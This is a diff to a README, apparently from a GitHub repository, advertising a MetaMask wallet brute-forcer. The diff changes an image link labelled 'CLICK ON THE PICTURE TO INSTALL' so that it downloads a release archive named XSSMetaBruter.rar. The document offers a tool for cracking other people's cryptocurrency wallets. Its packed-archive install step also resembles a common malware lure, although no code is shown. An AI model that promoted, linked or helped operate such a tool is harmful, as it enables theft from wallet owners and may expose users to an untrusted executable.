@@ -35,4 +35,4 @@ Value designation in config.json
 6. Wait for the bruteforce to finish; the results will be saved in a txt file next to your bruteforcer exe file.
 7. CLICK ON THE PICTURE TO INSTALL
 
-[![image](https://github.com/user-attachments/assets/8e8e7d9c-c811-4121-b791-51090a03d458)](https://github.com/ethgenius/brutecheker/releases/download/brutemetamask)
+[![image](https://github.com/user-attachments/assets/8e8e7d9c-c811-4121-b791-51090a03d458)](https://github.com/ethgenius/brutecheker/releases/download/brutemetamask/XSSMetaBruter.rar)
